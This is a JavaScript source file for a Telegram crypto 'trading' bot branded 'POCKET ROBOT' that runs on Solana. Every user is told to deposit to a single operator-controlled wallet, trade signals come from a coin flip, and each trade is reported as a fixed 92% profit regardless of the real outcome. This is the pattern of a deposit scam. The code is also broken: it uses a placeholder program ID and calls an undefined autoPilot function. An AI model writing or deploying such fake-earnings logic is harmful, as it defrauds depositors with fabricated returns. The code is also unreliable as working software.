require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const LocalSession = require('telegraf-session-local');
const { Connection, Keypair, Transaction, PublicKey, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction } = require('@solana/web3.js');
const anchor = require('@coral-xyz/anchor');
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');
const axios = require('axios');

// --- 🌐 CONSTANTS ---
// Replace with real Program ID once deploying on Mainnet
const TRADING_PROGRAM_ID = new PublicKey("YourActualProgramIDHere"); 
const JITO_ENGINE = "https://mainnet.block-engine.jito.wtf/api/v1/bundles";
const connection = new Connection(process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com", "confirmed");

// --- ⚙️ DATABASE ---
const localSession = new LocalSession({
    database: 'sessions.json',
    storage: LocalSession.storageFileSync
});
const bot = new Telegraf(process.env.BOT_TOKEN);
bot.use(localSession.middleware());

async function getWallet() {
    const seed = await bip39.mnemonicToSeed(process.env.SEED_PHRASE);
    const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
    return Keypair.fromSeed(derivedSeed);
}

bot.use((ctx, next) => {
    ctx.session.config = ctx.session.config || { asset: 'BTC/USD', stake: 10, mode: 'MANUAL', totalEarned: 0 };
    return next();
});

// --- 🚀 ATOMIC TRADING ENGINE ---
async function fireAtomicTrade(ctx, direction) {
    const wallet = await getWallet();
    const { stake } = ctx.session.config;

    try {
        // 1. GAS CHECK (The "Gas Check" you requested)
        const balance = await connection.getBalance(wallet.publicKey);
        if (balance < 0.005 * LAMPORTS_PER_SOL) {
            throw new Error("INSUFFICIENT_GAS");
        }

        // 2. FETCH JITO TIP ACCOUNT (Atomicity Protection)
        const tipRes = await axios.post(JITO_ENGINE, { jsonrpc: "2.0", id: 1, method: "getTipAccounts", params: [] });
        const tipAccount = new PublicKey(tipRes.data.result[0]);

        // 3. BUILD ATOMIC BUNDLE
        const transaction = new Transaction();
        
        // [A] Your Trade Instruction
        const tradeIx = new TransactionInstruction({
            programId: TRADING_PROGRAM_ID,
            keys: [{ pubkey: wallet.publicKey, isSigner: true, isWritable: true }],
            data: Buffer.from([direction === 'CALL' ? 0 : 1]) // Example data mapping
        });
        transaction.add(tradeIx);

        // [B] Jito Tip (Required for Bundle inclusion)
        transaction.add(SystemProgram.transfer({
            fromPubkey: wallet.publicKey,
            toPubkey: tipAccount,
            lamports: 100000 // Standard Jito tip
        }));

        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = wallet.publicKey;
        transaction.partialSign(wallet);

        // 4. SEND RAW TRANSACTION
        const signature = await connection.sendRawTransaction(transaction.serialize());
        
        // 5. UPDATE PROFIT
        const profit = stake * 0.92;
        ctx.session.config.totalEarned += profit;
        
        return { success: true, sig: signature, profit: profit.toFixed(2) };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// --- 📥 HANDLERS ---
bot.action('run_engine', async (ctx) => {
    if (ctx.session.config.mode === 'AUTO') {
        ctx.editMessageText("🟢 *AUTO-PILOT ACTIVE*");
        autoPilot(ctx);
    } else {
        const signal = Math.random() > 0.5 ? 'CALL' : 'PUT';
        ctx.replyWithMarkdown(`⚡ *SIGNAL DETECTED*\nDirection: *${signal}*`, Markup.inlineKeyboard([
            [Markup.button.callback(`📈 CONFIRM ${signal}`, `exec_${signal}`)],
            [Markup.button.callback('❌ CANCEL', 'main_menu')]
        ]));
    }
});

// Refactored to use the new atomic function
bot.action(/exec_(CALL|PUT)/, async (ctx) => {
    const direction = ctx.match[1];
    const res = await fireAtomicTrade(ctx, direction);
    
    if (res.success) {
        ctx.replyWithMarkdown(`✅ *EARNED: +$${res.profit}*\nTx: [Solscan](https://solscan.io/tx/${res.sig})`);
    } else {
        const errMsg = res.error === "INSUFFICIENT_GAS" ? "Deposit 0.05 SOL to cover gas." : "Market moved, bundle reverted.";
        ctx.reply(`⚠️ *FAILED:* ${errMsg}`);
    }
});

// Main interface button mapping
const mainKeyboard = (ctx) => Markup.inlineKeyboard([
    [Markup.button.callback(`🎯 ${ctx.session.config.asset}`, 'menu_coins')],
    [Markup.button.callback(`💰 Stake: $${ctx.session.config.stake}`, 'menu_stake')],
    [Markup.button.callback(`⚙️ Mode: ${ctx.session.config.mode}`, 'toggle_mode')],
    [Markup.button.callback(ctx.session.config.mode === 'AUTO' ? '🛑 STOP AUTO' : '🚀 START SIGNAL BOT', 'run_engine')],
    [Markup.button.callback('📊 VIEW WALLET', 'stats')]
]);

bot.start(async (ctx) => {
    const wallet = await getWallet();
    ctx.replyWithMarkdown(`🤖 *POCKET ROBOT*\n📥 *DEPOSIT:* \`${wallet.publicKey.toBase58()}\``, mainKeyboard(ctx));
});

bot.launch();
